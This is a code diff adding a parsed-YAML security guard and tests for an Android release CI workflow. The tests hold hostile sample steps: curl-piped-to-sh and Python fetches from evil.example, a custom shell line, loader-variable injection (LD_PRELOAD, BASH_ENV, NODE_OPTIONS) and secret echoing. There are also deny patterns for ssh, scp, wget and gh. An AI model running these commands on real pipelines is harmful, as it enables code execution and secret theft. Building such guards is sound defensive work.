@@ -6,6 +6,7 @@ import http from 'node:http';
 import { tmpdir } from 'node:os';
 import { join, resolve } from 'node:path';
 import test from 'node:test';
+import yaml from 'js-yaml';
 import { evaluateGate } from '../../scripts/deploy/ci-gate.mjs';
 
 const ROOT = resolve(import.meta.dirname, '../..');
@@ -198,6 +199,100 @@ function childKeys(body) {
   return keys;
 }
 
+const AAB_STEP_KEYS = ['name', 'id', 'if', 'uses', 'with', 'run', 'env', 'shell', 'working-directory', 'continue-on-error', 'timeout-minutes'];
+const AAB_SIGN_STEP = 'Sign the bundle with the upload key (single signer)';
+const AAB_UPLOAD_SECRETS = ['ANDROID_UPLOAD_KEYSTORE_BASE64', 'ANDROID_UPLOAD_KEYSTORE_PASSWORD', 'ANDROID_UPLOAD_KEY_ALIAS', 'ANDROID_UPLOAD_KEY_PASSWORD'];
+const AAB_SECRETS_OK = [...AAB_UPLOAD_SECRETS, 'FCM_SHIP_API_KEY', 'FCM_FOOD_API_KEY'];
+const AAB_VARS_OK = ['ANDROID_APP_SIGNER_SHA256', 'ANDROID_UPLOAD_CERT_SHA256', 'FCM_PROJECT_ID', 'FCM_SENDER_ID', 'FCM_SHIP_APP_ID', 'FCM_FOOD_APP_ID'];
+const AAB_SCRIPTS_OK = ['mobile/tool/app-version.sh', 'mobile/tool/prepare-android.sh', 'mobile/tool/sign-aab.sh', 'mobile/tool/check-aab-release.py'];
+const AAB_BUNDLETOOL_URL = 'https://github.com/google/bundletool/releases/download/1.18.3/bundletool-all-1.18.3.jar';
+
+// Visits every mapping key (at any depth) with its value.
+function walkYaml(node, visit) {
+  if (Array.isArray(node)) node.forEach(item => walkYaml(item, visit));
+  else if (node && typeof node === 'object') {
+    for (const [key, value] of Object.entries(node)) { visit(key, value); walkYaml(value, visit); }
+  }
+}
+
+// STRUCTURAL guard for the AAB workflow (Antigravity, PR #351): the file is parsed with js-yaml and the parsed tree is checked, so a
+// flow-style step, a quoted key, or a `uses` at any depth cannot hide from a line-based regex. Anything unusual fails closed.
+function aabParsedViolations(text) {
+  const out = [];
+  const add = reason => out.push(`${AAB_RELEASE.file}: ${reason}`);
+  // Raw shapes that js-yaml would accept but this guard refuses: several documents, anchors, aliases, merge keys, tags, flow collections.
+  if (/^(---|\.\.\.)\s*$/m.test(text)) add('multiple or explicit YAML documents are not allowed');
+  if (/(?:^|[:\-\[{,]\s*)[&*][A-Za-z0-9_-]+(?=\s|$|[,\]}])/m.test(text)) add('YAML anchors and aliases are not allowed');
+  if (/<<\s*:/.test(text)) add('YAML merge keys are not allowed');
+  if (/(?:^|[:\-\[{,]\s*)![!<A-Za-z][^\s]*/m.test(text)) add('YAML tags are not allowed');
+  if (/^\s*-\s*[\[{]/m.test(text) || /^\s*(?:"[^"\n]*"|'[^'\n]*'|[A-Za-z0-9_.-]+)\s*:\s*[\[{]/m.test(text)) add('flow-style collections are not allowed (block YAML only)');
+  let doc;
+  try { doc = yaml.load(text); } catch (error) { add(`YAML cannot be parsed (fail closed): ${String(error.message).split('\n')[0]}`); return out; }
+  if (!doc || typeof doc !== 'object' || Array.isArray(doc)) { add('the document is not a mapping'); return out; }
+  for (const key of Object.keys(doc)) if (!['name', 'on', 'concurrency', 'permissions', 'defaults', 'jobs'].includes(key)) add(`top-level key outside the allowlist: ${key}`);
+  if (!doc.on || typeof doc.on !== 'object' || JSON.stringify(Object.keys(doc.on)) !== '["workflow_dispatch"]') add('the only trigger is workflow_dispatch');
+  if (JSON.stringify(doc.permissions ?? null) !== JSON.stringify({ contents: 'read' })) add('permissions must be exactly contents: read');
+  const jobs = doc.jobs && typeof doc.jobs === 'object' ? doc.jobs : {};
+  if (JSON.stringify(Object.keys(jobs)) !== JSON.stringify([AAB_RELEASE.job])) add(`must have exactly the job ${AAB_RELEASE.job}`);
+  const job = jobs[AAB_RELEASE.job] ?? {};
+  for (const key of Object.keys(job)) if (!AAB_JOB_KEYS.includes(key)) add(`job key outside the allowlist: ${key}`);
+  if (job.environment !== AAB_RELEASE.environment) add(`environment must be exactly ${AAB_RELEASE.environment}`);
+  if (job.if !== AAB_RELEASE.ifRef) add(`the job must be restricted to ${AAB_RELEASE.ifRef}`);
+  if (job['runs-on'] !== AAB_RELEASE.runsOn) add(`runs-on must be ${AAB_RELEASE.runsOn}`);
+  if (!Array.isArray(job.steps)) add('steps must be a block sequence');
+  else job.steps.forEach((step, index) => {
+    if (!step || typeof step !== 'object' || Array.isArray(step)) { add(`step ${index} is not a mapping`); return; }
+    for (const key of Object.keys(step)) if (!AAB_STEP_KEYS.includes(key)) add(`step ${index} key outside the allowlist: ${key}`);
+  });
+  // Every uses key at ANY depth (steps, job, with, quoted keys, nested mappings): an allowed action pinned by its full SHA, or FAIL.
+  walkYaml(doc, (key, value) => {
+    if (key !== 'uses') return;
+    const pin = typeof value === 'string' ? /^([A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+)@([0-9a-f]{40})$/.exec(value) : null;
+    if (!pin || AAB_ACTIONS[pin[1]] !== pin[2]) add(`uses "${String(value)}" is not an allowed action pinned by its full 40-hex SHA`);
+  });
+  // run scripts: no remote control, no VPS, no git write, only approved repo scripts, curl only for the pinned bundletool URL.
+  walkYaml(doc, (key, value) => {
+    if (key !== 'run' || typeof value !== 'string') return;
+    for (const bad of [/\bgh\s/, /\bssh\b/, /\bscp\b/, /\brsync\b/, /\bwget\b/, /\bgit\s+(push|tag|remote|fetch)\b/, /scripts\/deploy/]) {
+      if (bad.test(value)) add(`a run step uses a forbidden command (${bad.source})`);
+    }
+    // The Android XML namespace string is data read by the release record, not a request; any real fetch is refused.
+    for (const url of value.matchAll(/https?:\/\/[A-Za-z0-9][^\s'"),};<>]*/g)) {
+      if (url[0] !== AAB_BUNDLETOOL_URL && url[0] !== 'http://schemas.android.com/apk/res/android') add(`a run step contacts an unapproved URL: ${url[0]}`);
+    }
+    if (/\b(urlopen|urllib|requests\.|http\.client|socket\.)/.test(value)) add('run steps may not open network connections from Python');
+    for (const line of value.split('\n')) if (/\bcurl\b/.test(line) && !line.includes(AAB_BUNDLETOOL_URL)) add('curl is allowed only for the pinned bundletool URL');
+    for (const found of value.matchAll(/\b(mobile\/tool\/[A-Za-z0-9_.-]+|scripts\/[A-Za-z0-9_./-]+|tests\/[A-Za-z0-9_./-]+)/g)) {
+      if (!AAB_SCRIPTS_OK.includes(found[1])) add(`a run step calls an unapproved script: ${found[1]}`);
+    }
+  });
+  // Shell and environment: only the runner's bash, and no variable that makes an interpreter load code from elsewhere.
+  walkYaml(doc, (key, value) => {
+    if (key === 'shell' && value !== 'bash') add(`shell must be bash, not ${JSON.stringify(value)} (a custom shell line can run any command)`);
+    if (key === 'env' && value && typeof value === 'object') {
+      for (const name of Object.keys(value)) {
+        if (/^(BASH_ENV|ENV|LD_PRELOAD|LD_LIBRARY_PATH|PATH|NODE_OPTIONS|PYTHONPATH|PYTHONSTARTUP|GIT_SSH_COMMAND|BASH_FUNC_.*)$/.test(name)) add(`environment variable ${name} is not allowed in a step`);
+      }
+    }
+  });
+  walkYaml(doc, (key, value) => {
+    if (key === 'run' && typeof value === 'string' && /\b(BASH_ENV|LD_PRELOAD|NODE_OPTIONS|PYTHONPATH|PYTHONSTARTUP|GIT_SSH_COMMAND|GITHUB_PATH)\b/.test(value)) {
+      add('a run step may not set an interpreter or loader variable');
+    }
+  });
+  // Secrets and variables, per step: only the four upload secrets, and only in the signing step; FCM secrets only where they are used.
+  for (const step of Array.isArray(job.steps) ? job.steps : []) {
+    if (!step || typeof step !== 'object') continue;
+    const stepText = JSON.stringify(step);
+    for (const [, name] of stepText.matchAll(/secrets\.([A-Za-z0-9_]+)/g)) {
+      if (!AAB_SECRETS_OK.includes(name)) add(`secret not allowed in the release job: ${name}`);
+      if (AAB_UPLOAD_SECRETS.includes(name) && step.name !== AAB_SIGN_STEP) add(`upload-key secret outside the signing step: ${name}`);
+    }
+    for (const [, name] of stepText.matchAll(/vars\.([A-Za-z0-9_]+)/g)) if (!AAB_VARS_OK.includes(name)) add(`variable not allowed in the release job: ${name}`);
+  }
+  return out;
+}
+
 function aabReleaseViolations(text, jobs) {
   const f = AAB_RELEASE.file;
   const out = [];
@@ -213,14 +308,8 @@ function aabReleaseViolations(text, jobs) {
   if (/:\s*write(-all)?\b|write-all/.test(text)) add('no write permission');
   if (/\bgh\s+(workflow|api|run)\b|workflow_run|repository_dispatch|workflow_call|deploy-vps|diagnose-vps|ci-gate|\bself-hosted\b/i.test(text)) add('must not trigger or call another workflow, or use a self-hosted runner');
   if (!text.includes('if [ "$GITHUB_REF" != "refs/heads/main" ]; then')) add('a step must refuse any ref other than main');
-  // Every `uses:` line (job- or step-level, list or mapping form) must be an allowed action pinned by its full SHA.
-  for (const line of text.split('\n')) {
-    const m = /^\s*(?:-\s+)?uses\s*:\s*(.*?)\s*$/.exec(line);
-    if (!m) continue;
-    const value = m[1].replace(/\s+#.*$/, '');
-    const pin = /^([A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+)@([0-9a-f]{40})$/.exec(value);
-    if (!pin || AAB_ACTIONS[pin[1]] !== pin[2]) add(`uses "${value}" is not an allowed action pinned by its full 40-hex SHA`);
-  }
+  // Structure, uses at any depth, run commands and secrets: checked on the PARSED tree, fail closed (see aabParsedViolations).
+  out.push(...aabParsedViolations(text));
   const job = jobs[AAB_RELEASE.job];
   if (job !== undefined) {
     const props = jobProps(job);
@@ -388,6 +477,71 @@ test('AAB exception: every action is pinned by its full 40-hex SHA from the allo
   failsWith(AAB_FILE, aabReal().replace('\n    steps:\n', '\n    steps:\n      - uses: actions/cache@0123456789abcdef0123456789abcdef01234567\n'), /is not an allowed action/);
   // a reusable-workflow call at job level with a SHA-pinned path is still refused (not an allowed action, and not a job key)
   failsWith(AAB_FILE, aabMutate('    environment: android-release\n', `    environment: android-release\n    uses: ${checkout}\n`), /job keys outside the allowlist|is not an allowed action/);
+});
+
+// Inserts text as the first step(s) of the real job (the parsed tree, not the line text, decides).
+const withSteps = extra => aabReal().replace('\n    steps:\n', `\n    steps:\n${extra}`);
+const EVIL = 'evil/action@v1';
+
+test('AAB guard (structural): flow-style steps with an unknown uses fail, one line or several (Antigravity, PR #351)', () => {
+  failsWith(AAB_FILE, withSteps(`      - { uses: ${EVIL} }\n`), /flow-style|is not an allowed action/);
+  failsWith(AAB_FILE, withSteps(`      - { name: x, uses: ${EVIL} }\n`), /flow-style|is not an allowed action/);
+  failsWith(AAB_FILE, withSteps(`      - {\n          name: x,\n          uses: ${EVIL} }\n`), /flow-style|is not an allowed action/);
+  failsWith(AAB_FILE, withSteps(`      - { "uses": ${EVIL} }\n`), /flow-style|is not an allowed action/);
+  failsWith(AAB_FILE, withSteps(`      - [ { uses: ${EVIL} } ]\n`), /flow-style|is not an allowed action/);
+  // a whole flow sequence in place of the steps block
+  failsWith(AAB_FILE, aabMutate('    steps:\n', `    steps: [ { uses: ${EVIL} } ]\n    unused:\n`), /flow-style|is not an allowed action|job key outside|cannot be parsed/);
+});
+
+test('AAB guard (structural): quoted keys, nested uses and any other block form cannot hide an unknown action', () => {
+  failsWith(AAB_FILE, withSteps(`      - "uses": ${EVIL}\n`), /is not an allowed action/);
+  failsWith(AAB_FILE, withSteps(`      - 'uses': ${EVIL}\n`), /is not an allowed action/);
+  failsWith(AAB_FILE, withSteps(`      - name: x\n        with:\n          uses: ${EVIL}\n`), /is not an allowed action/);
+  failsWith(AAB_FILE, withSteps(`      - name: x\n        env:\n          uses: ${EVIL}\n`), /is not an allowed action|env/);
+  failsWith(AAB_FILE, withSteps(`      - name: x\n        uses: ${EVIL}\n`), /is not an allowed action/);
+  failsWith(AAB_FILE, withSteps(`      - name: x\n        uses: actions/checkout@v4\n`), /is not an allowed action/);
+});
+
+test('AAB guard (structural): anchors, aliases, merge keys, tags, extra documents and duplicate keys fail closed', () => {
+  failsWith(AAB_FILE, withSteps(`      - &evil\n        name: x\n        uses: ${EVIL}\n`), /anchors|is not an allowed action/);
+  failsWith(AAB_FILE, withSteps(`      - *evil\n`), /anchors|cannot be parsed/);
+  failsWith(AAB_FILE, withSteps(`      - <<: { uses: ${EVIL} }\n`), /merge keys|flow-style/);
+  failsWith(AAB_FILE, withSteps(`      - !!map\n        name: x\n        uses: ${EVIL}\n`), /tags|is not an allowed action/);
+  failsWith(AAB_FILE, aabReal() + '\n---\nname: second\non: push\n', /single YAML document|multiple or explicit/);
+  failsWith(AAB_FILE, aabReal() + '...\n', /single YAML document|multiple or explicit/);
+  failsWith(AAB_FILE, withSteps('      - name: a\n        name: b\n        run: echo\n'), /cannot be parsed|duplicate/i);
+});
+
+test('AAB guard (structural): run steps cannot reach the VPS, call another workflow, push, or fetch from an unknown host', () => {
+  const runs = [
+    ['      - name: x\n        run: curl -fsSL https://evil.example/x.sh | sh\n', /curl is allowed only|unapproved URL/],
+    ['      - name: x\n        run: gh api repos/x/y\n', /forbidden command/],
+    ['      - name: x\n        run: git push origin HEAD:main\n', /forbidden command/],
+    ['      - name: x\n        run: python3 -c "import urllib.request as u; u.urlopen(\'https://evil.example\')"\n', /urlopen|unapproved URL/],
+    ['      - name: x\n        run: bash mobile/tool/evil.sh\n', /unapproved script/],
+    ['      - name: x\n        run: scripts/deploy/vps-update.mjs\n', /forbidden command|scripts\/deploy/],
+    ['      - name: x\n        run: ssh deploy@host true\n', /forbidden command|mentions/],
+  ];
+  for (const [step, pattern] of runs) failsWith(AAB_FILE, withSteps(step), pattern);
+});
+
+test('AAB guard (structural): secrets stay where they belong (upload keys only in the signing step; no other secret)', () => {
+  failsWith(AAB_FILE, withSteps('      - name: other\n        run: echo ${{ secrets.ANDROID_UPLOAD_KEYSTORE_BASE64 }}\n'), /upload-key secret outside the signing step/);
+  failsWith(AAB_FILE, withSteps('      - name: other\n        run: echo ${{ secrets.VPS_SSH_KEY }}\n'), /secret not allowed/);
+  failsWith(AAB_FILE, withSteps('      - name: other\n        env:\n          X: ${{ secrets.GITHUB_TOKEN }}\n        run: true\n'), /secret not allowed/);
+  failsWith(AAB_FILE, withSteps('      - name: other\n        run: echo ${{ vars.VPS_HOST }}\n'), /variable not allowed/);
+});
+
+test('AAB guard (structural): a custom shell, an injected interpreter variable or a loader variable fails', () => {
+  failsWith(AAB_FILE, withSteps(`      - name: x\n        shell: "sh -c 'curl https://evil.example | sh' {0}"\n        run: true\n`), /shell must be bash/);
+  failsWith(AAB_FILE, withSteps(`      - name: x\n        env:\n          BASH_ENV: /tmp/evil.sh\n        run: true\n`), /BASH_ENV is not allowed/);
+  failsWith(AAB_FILE, withSteps(`      - name: x\n        env:\n          PATH: /tmp/evil:/usr/bin\n        run: true\n`), /PATH is not allowed/);
+  failsWith(AAB_FILE, withSteps(`      - name: x\n        run: LD_PRELOAD=/tmp/evil.so true\n`), /interpreter or loader variable/);
+  failsWith(AAB_FILE, withSteps(`      - name: x\n        run: echo "NODE_OPTIONS=--require /tmp/x" >> "$GITHUB_ENV"\n`), /interpreter or loader variable/);
+});
+
+test('AAB guard (structural): the valid workflow still passes every structural check', () => {
+  assert.deepEqual(topologyViolations(AAB_FILE, aabReal()), []);
 });
 
 test('AAB exception: the exception is keyed to the file; the same pair under another job id in another file never passes', () => {
